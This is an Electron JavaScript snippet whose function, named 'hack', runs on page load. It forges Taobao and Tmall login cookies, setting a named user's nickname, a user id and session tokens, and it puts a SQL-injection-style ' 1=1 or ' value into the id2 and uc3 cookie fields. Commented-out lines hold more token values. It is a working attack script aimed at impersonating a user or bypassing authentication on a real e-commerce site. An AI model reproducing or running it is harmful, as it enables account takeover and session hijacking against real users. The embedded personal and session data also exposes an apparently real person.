const session = require('electron').remote.session;
let hack = function () {
    let nick_name = encodeURIComponent('刘筱伦');
    let id = '17681613';
    let id2 = ' 1=1 or ';
    let domains = ['domain=.tmall.com', 'domain=.taobao.com'];
    nick_name = "%5Cu5218%5Cu7B71%5Cu4F26";

    domains.forEach(domain => {
        document.cookie = "dnk=" + nick_name + ";" + domain;
        document.cookie = "_nk_=" + nick_name + ";" + domain;
        document.cookie = "tracknick=" + nick_name + ";" + domain;
        document.cookie = "lgc=" + nick_name + ";" + domain;
        document.cookie = "unb=" + id + ";" + domain;
        document.cookie = "existShop=MTU1ODkyNTgwMg%3D%3D;" + domain;
        document.cookie = "_l_g_=Ug%3D%3D;" + domain;
        document.cookie = "tg=0;" + domain;

        document.cookie = "enc=TLDab%2FqWhL0CVS7Y2EudGyiGyoyIhQp6mxjunsU6lHxADDF7TLMdpxwdsvONYinTr2VfxcHfznhJJqtHtG%2BtXg%3D%3D;" + domain;
        document.cookie = "skt=70ed610906312824;" + domain;
        document.cookie = "csg=2781c416;" + domain;

        document.cookie = "cookie17=" + id2 + ";" + domain;
        document.cookie = "uc3=vt3=F8dBy3vPh4zzLQm4BW8%3D&id2=" + id2 + "&nk2=qVKSVUzY&lg2=URm48syIIVrSKA%3D%3D;" + domain;

        // document.cookie = "sg=m23;" + domain;
        // document.cookie = "_cc_=VFC%2FuZ9ajQ%3D%3D;" + domain;

        // document.cookie = "cookie1=BdWMlr3BhLgCeREByUBXLutQhNFM8DgHv1F1boDtAow%3D;" + domain;
        // document.cookie = "uc1=cookie16=U%2BGCWk%2F74Mx5tgzv3dWpnhjPaQ%3D%3D&cookie21=U%2BGCWk%2F7oPZZnSPh0Og%3D&cookie15=V32FPkk%2Fw0dUvg%3D%3D&existShop=false&pas=0&cookie14=UoTZ7HyPZhh5LA%3D%3D&tag=8&lng=zh_CN;" + domain;
        // document.cookie = "login=true;" + domain;
        // document.cookie = "miid=398825781324972039;" + domain;
        // document.cookie = "_l_g_=Ug%3D%3D;" + domain;
        // document.cookie = "sg=%E4%BC%A635;" + domain;
        // document.cookie = "_cc_=U%2BGCWk%2F7og%3D%3D;" + domain;
        // document.cookie = "csg=55b28a96;" + domain;
        // document.cookie = "existShop=MTU1ODg3OTE0OQ%3D%3D;" + domain;
        // document.cookie = "tg=0;" + domain;
        // document.cookie = "UM_distinctid=16a47cc9de319d-07005c81e5082-3b7a516b-fa000-16a47cc9de65ca;" + domain;
        console.log(domain);
    })
    console.log("cookie:" + document.cookie);



    // let script = document.querySelector("body script");
    // let queryStr = script.getAttribute("exparams");
    // let uid = queryStr.split("userid=")[1].split("&")[0];
    // console.log("uid:" + uid);
    // if (uid) {
    //     console.log("in.............................................")
    // }
}

window.onload = hack;

window.onbeforeunload = function(){
    // debugger;
}